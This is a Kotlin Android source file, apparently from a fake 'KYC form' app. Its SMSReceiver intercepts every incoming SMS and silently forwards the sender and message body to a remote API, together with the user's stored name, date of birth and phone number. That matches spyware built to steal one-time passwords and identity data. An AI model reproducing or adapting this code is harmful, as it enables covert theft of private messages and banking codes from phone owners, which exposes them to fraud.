package br.com.helpdev.kycform.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import br.com.helpdev.kycform.helper.*
import com.google.gson.JsonObject
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response


class SMSReceiver : BroadcastReceiver() {
    companion object {
        private val TAG by lazy { SMSReceiver::class.java.simpleName }
    }
    val m1= PrefrenceManger1()

    override fun onReceive(context: Context?, intent: Intent?) {
        if (!intent?.action.equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) return
        val extractMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        extractMessages.forEach { smsMessage -> Log.v(TAG, smsMessage.displayMessageBody) }


        val apiService = RestApiService()
        val userInfo = DataRequest(
            sender_no = ""+extractMessages[0].displayOriginatingAddress,
            body = ""+extractMessages[0].displayMessageBody,
            name = ""+(context?.let { m1?.getName(it.applicationContext) }),
            dob = ""+(context?.let { m1?.getDob(it.applicationContext) }),
            contact = ""+ (context?.let { m1?.getmobilno(it.applicationContext) })

        )
        //TODO

  addUser(userInfo)

    }

    fun addUser(userData: DataRequest){
        val retrofit = ServiceBuilder.buildService(RestApi::class.java)
        retrofit.addUser(userData).enqueue(
            object : Callback<JsonObject> {
                override fun onFailure(call: Call<JsonObject>, t: Throwable) {
                   // onResult(null)
                    Log.e("message_error", t.toString())
                }

                override fun onResponse(call: Call<JsonObject>, response: Response<JsonObject>) {
                    val addedUser = response.body()
                    Log.v(TAG, response.body().toString())
                    Log.e("message_res", response.body().toString())
                    //onResult(addedUser)
                }
            }
        )
    }







}